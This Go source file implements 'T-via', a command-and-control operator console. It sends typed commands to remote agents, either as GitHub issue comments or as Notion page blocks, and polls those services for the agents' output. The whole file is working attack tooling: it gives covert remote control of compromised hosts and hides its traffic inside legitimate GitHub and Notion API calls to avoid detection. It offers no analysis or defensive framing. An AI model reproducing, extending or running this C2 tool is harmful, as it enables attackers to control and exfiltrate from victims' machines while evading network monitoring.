package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

// ANSI Color Codes
const (
	Reset  = "\033[0m"
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Cyan   = "\033[36m"
	White  = "\033[37m"
	Bold   = "\033[1m"
)

type github struct {
	Access_token string            `json:"access_token"`
	UrlC         string            `json:"url_for_comment"`
	Accept       string            `json:"accept"`
	UrlI         string            `json:"url_for_issues"`
	TitleI       string            `json:"title_for_issues"`
	BodyC        map[string]string `json:"body_for_comments"`
	BodyI        map[string]string `json:"body_for_issues"`
	Repo_Name    string            `json:"repo_name"`
	Owner        string            `json:"owner"`
}

type notion struct {
	Integration_Token string `json:"integration_token"`
	Page_ID           string `json:"page_id"`
}

func printBanner() {
	banner := `
  _______         __      __ _         
 |__   __|        \ \    / /(_)        
    | |    ______  \ \  / /  _   __ _  
    | |   |______|  \ \/ /  | | / _' | 
    | |              \  /   | | (_| | 
    |_|               \/    |_| \__,_| 

                             
    T-via Operator Interface V2
    Secure C2 communication layer
`
	fmt.Printf("%s%s%s\n", Cyan, banner, Reset)
}

func ForGithub(owner, repo, token string, interval int) {
	fmt.Printf("%s[*] Initializing GitHub C2 for %s/%s...%s\n", Yellow, owner, repo, Reset)

	obj := github{
		Owner:        owner,
		Repo_Name:    repo,
		Access_token: token,
	}

	obj.BodyI = map[string]string{
		"title": "API created Issue",
		"body":  "This issue is generated to solve API",
	}

	obj.UrlI = fmt.Sprintf("https://api.github.com/repos/%s/%s/issues", obj.Owner, obj.Repo_Name)

	BodyI, _ := json.Marshal(obj.BodyI)

	req, _ := http.NewRequest("POST", obj.UrlI, bytes.NewBuffer(BodyI))
	req.Header.Add("Authorization", "Bearer "+obj.Access_token)
	req.Header.Add("Accept", "application/vnd.github+json")

	client := &http.Client{}
	response, err := client.Do(req)

	if err != nil || (response.StatusCode < 200 || response.StatusCode >= 300) {
		fmt.Printf("%s[-] Failed to create issue. Check credentials/permissions.%s\n", Red, Reset)
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Printf("Status: %d\n", response.StatusCode)
		}
		return
	}
	defer response.Body.Close()

	fmt.Printf("%s[+] Successfully created the issue.%s\n", Green, Reset)

	var body map[string]interface{}
	json.NewDecoder(response.Body).Decode(&body)

	commentsUrl, ok := body["comments_url"].(string)
	if !ok {
		fmt.Printf("%s[-] Could not find comments URL in response.%s\n", Red, Reset)
		return
	}
	obj.UrlC = commentsUrl

	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Printf("%s%scommand> %s", Bold, Cyan, Reset)
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		if cmd == "" {
			continue
		}
		if cmd == "exit" || cmd == "quit" {
			break
		}

		// sending command
		obj.BodyC = map[string]string{"body": cmd}
		BodyC, _ := json.Marshal(obj.BodyC)
		req2, _ := http.NewRequest("POST", obj.UrlC, bytes.NewBuffer(BodyC))
		req2.Header.Add("Authorization", "Bearer "+obj.Access_token)
		req2.Header.Add("Accept", "application/vnd.github+json")

		res2, err2 := client.Do(req2)
		if err2 != nil {
			fmt.Printf("%s[-] Error sending command: %v%s\n", Red, err2, Reset)
			continue
		}
		res2.Body.Close()

		fmt.Printf("%s[*] Command sent. Waiting for output...%s\n", Yellow, Reset)

		found := false
		maxRetries := 60 / interval
		if maxRetries < 1 {
			maxRetries = 1
		}
		for i := 0; i < maxRetries; i++ {
			time.Sleep(time.Duration(interval) * time.Second)

			req3, _ := http.NewRequest("GET", obj.UrlC, nil)
			req3.Header.Add("Authorization", "Bearer "+obj.Access_token)
			req3.Header.Add("Accept", "application/vnd.github+json")

			response3, err3 := client.Do(req3)
			if err3 != nil {
				continue
			}

			var outputArr []map[string]interface{}
			bodyBytes, _ := io.ReadAll(response3.Body)
			response3.Body.Close()
			json.Unmarshal(bodyBytes, &outputArr)

			if len(outputArr) > 0 {
				lastBody := outputArr[len(outputArr)-1]["body"].(string)
				if lastBody != cmd {
					fmt.Printf("%s[+] Output: \n%s%s%s%s\n", Green, Reset, White, lastBody, Reset)
					found = true
					break
				}
			}
		}

		if !found {
			fmt.Printf("%s[!] Timeout waiting for agent output.%s\n", Yellow, Reset)
		}
	}
}

func ForNotion(token, pageID string, interval int) {
	fmt.Printf("%s[*] Initializing Notion C2 for page: %s...%s\n", Yellow, pageID, Reset)

	obj := notion{
		Integration_Token: token,
		Page_ID:           pageID,
	}

	url := "https://api.notion.com/v1/blocks/" + obj.Page_ID + "/children"

	fmt.Printf("%s[+] NotionC2 Operator Started!%s\n", Green, Reset)

	reader := bufio.NewReader(os.Stdin)

	// Keep track of the last block ID we processed as a response
	var lastProcessedBlockID string

	for {
		fmt.Printf("%s%snotion-operator> %s", Bold, Blue, Reset)
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		if cmd == "" {
			continue
		}
		if cmd == "exit" || cmd == "quit" {
			break
		}

		// Append command block to Notion
		payload := fmt.Sprintf(`{
			"children": [
				{
					"object": "block",
					"type": "paragraph",
					"paragraph": {
						"rich_text": [
							{
								"type": "text",
								"text": { "content": "%s" }
							}
						]
					}
				}
			]
		}`, cmd)

		req, _ := http.NewRequest("PATCH", url, strings.NewReader(payload))
		req.Header.Add("Notion-Version", "2022-06-28")
		req.Header.Add("Authorization", "Bearer "+obj.Integration_Token)
		req.Header.Add("Content-Type", "application/json")

		res, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Printf("%s[-] Error sending command to Notion: %v%s\n", Red, err, Reset)
			continue
		}

		// Get the block ID of our command to avoid confusing it with the response
		var appendOutput map[string]interface{}
		body, _ := io.ReadAll(res.Body)
		res.Body.Close()
		json.Unmarshal(body, &appendOutput)

		results, ok := appendOutput["results"].([]interface{})
		if ok && len(results) > 0 {
			lastProcessedBlockID = results[len(results)-1].(map[string]interface{})["id"].(string)
		}

		fmt.Printf("%s[*] Command sent. Block ID: %s. Waiting for response...%s\n", Yellow, lastProcessedBlockID, Reset)

		// Wait for response
		found := false
		maxRetries := 100 / interval
		if maxRetries < 1 {
			maxRetries = 1
		}
		for i := 0; i < maxRetries; i++ { // Poll for ~100 seconds max
			time.Sleep(time.Duration(interval) * time.Second)

			req1, _ := http.NewRequest("GET", url, nil)
			req1.Header.Add("Notion-Version", "2022-06-28")
			req1.Header.Add("Authorization", "Bearer "+obj.Integration_Token)

			res1, err1 := http.DefaultClient.Do(req1)
			if err1 != nil {
				continue
			}

			body1, _ := io.ReadAll(res1.Body)
			res1.Body.Close()

			var pollOutput map[string]interface{}
			json.Unmarshal(body1, &pollOutput)

			blocks, ok := pollOutput["results"].([]interface{})
			if !ok || len(blocks) == 0 {
				continue
			}

			lastBlock := blocks[len(blocks)-1].(map[string]interface{})
			lastID := lastBlock["id"].(string)

			if lastID != lastProcessedBlockID {
				if lastBlock["type"] == "paragraph" {
					para := lastBlock["paragraph"].(map[string]interface{})
					rich := para["rich_text"].([]interface{})
					if len(rich) > 0 {
						displayText := rich[0].(map[string]interface{})["text"].(map[string]interface{})["content"].(string)
						fmt.Printf("%s[+] Agent Response: \n%s%s%s%s\n", Green, Reset, White, displayText, Reset)
						lastProcessedBlockID = lastID
						found = true
						break
					}
				}
			}
		}

		if !found {
			fmt.Printf("%s[!] No response from agent yet. You can keep waiting or send another command.%s\n", Yellow, Reset)
		}
	}
}

func main() {
	printBanner()

	notionCmd := flag.NewFlagSet("notion", flag.ExitOnError)
	notionToken := notionCmd.String("token", "", "Notion Integration Token")
	notionPage := notionCmd.String("page", "", "Notion Page ID")
	notionInterval := notionCmd.Int("interval", 5, "Polling interval in seconds")

	githubCmd := flag.NewFlagSet("github", flag.ExitOnError)
	githubOwner := githubCmd.String("owner", "", "GitHub Username/Owner")
	githubRepo := githubCmd.String("repo", "", "GitHub Repository Name")
	githubToken := githubCmd.String("token", "", "GitHub Personal Access Token")
	githubInterval := githubCmd.Int("interval", 5, "Polling interval in seconds")

	if len(os.Args) < 2 {
		fmt.Println("Usage: T-via <command> [arguments]")
		fmt.Println("Commands:")
		fmt.Println("  notion  - Start Notion C2 operator")
		fmt.Println("  github  - Start GitHub C2 operator")
		os.Exit(1)
	}

	switch os.Args[1] {
	case "notion":
		notionCmd.Parse(os.Args[2:])
		if *notionToken == "" || *notionPage == "" {
			fmt.Println("Usage: T-via notion -token <token> -page <page_id> [-interval <sec>]")
			os.Exit(1)
		}
		ForNotion(*notionToken, *notionPage, *notionInterval)
	case "github":
		githubCmd.Parse(os.Args[2:])
		if *githubOwner == "" || *githubRepo == "" || *githubToken == "" {
			fmt.Println("Usage: T-via github -owner <owner> -repo <repo> -token <token> [-interval <sec>]")
			os.Exit(1)
		}
		ForGithub(*githubOwner, *githubRepo, *githubToken, *githubInterval)
	case "help", "-h", "--help":
		fmt.Println("Usage: T-via <command> [arguments]")
		fmt.Println("\nNotion Command:")
		notionCmd.PrintDefaults()
		fmt.Println("\nGitHub Command:")
		githubCmd.PrintDefaults()
	default:
		fmt.Printf("%sUnknown command: %s%s\n", Red, os.Args[1], Reset)
		os.Exit(1)
	}
}
